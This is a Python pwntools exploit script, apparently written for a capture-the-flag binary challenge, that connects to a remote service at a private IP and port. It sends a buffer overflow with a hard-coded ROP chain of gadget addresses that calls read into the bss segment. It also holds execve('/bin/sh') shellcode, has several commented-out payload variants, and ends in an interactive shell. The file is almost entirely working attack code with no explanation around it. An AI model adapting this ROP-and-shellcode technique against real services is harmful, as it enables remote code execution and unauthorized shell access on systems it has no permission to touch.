#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *


#e = ELF('')
#l = ELF('')

context.arch = 'amd64'

#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#print util.proc.pidof(y)

host , port = '10.13.2.43' , 20739
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

syscall = 0x400122
add_rsp_ret = 0x400110
out_write = 0x400103
pppr = 0x4000a9 # pop rdi , pop rsi , pop rdx , ret
read = 0x40011f
bss = 0x600125
bss = 0x600125
pt = 0x4000de
stk = 0x7ffe4efa2618
pop_rax_ret = 0x400114
main = 0x400080
'''
    xor rax,rax
	syscall
	ret
'''

p = 'a' * 0x30
p += p64( bss )
p += p64(syscall)
p += flat(
    pppr,
    0x0,
    bss,
    0x70,
    read,
    0x4000cf

)
'''
p += flat(
     0x4000ab,
     0x0,
     0x400114,
     322,
     syscall
)
'''
'''
p += flat(
    pppr,
    0x0,
    0x600128,
    0x70,
    read,
    0x600128
)
'''
print hex( len( p ) )

sc = '\x90' * 20 + 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

#p += p64( add_rsp_ret )
#p += 'P' * 0x20
#p += p64( out_write )

#p += 'D' * ( 0x80 - len(p) )
#p += flat(
#    out_write
#)

'''
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
'''


y.sendafter( '?' , p )
#sleep(3)
#y.send( 'a' * 0x60 )
#y.sendline( '\x90' * 10 + 'H\xc7\xc1\xde\x00@\x00\xff\xe1' )
#y.send( 'H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2j;X\x0f\x05' )
#y.sendline( sc )


#stk = u64( y.recv(6).ljust( 8 , '\x00' ) )

#log.success( 'stack -> {}'.format( hex( stk ) ) )




y.interactive()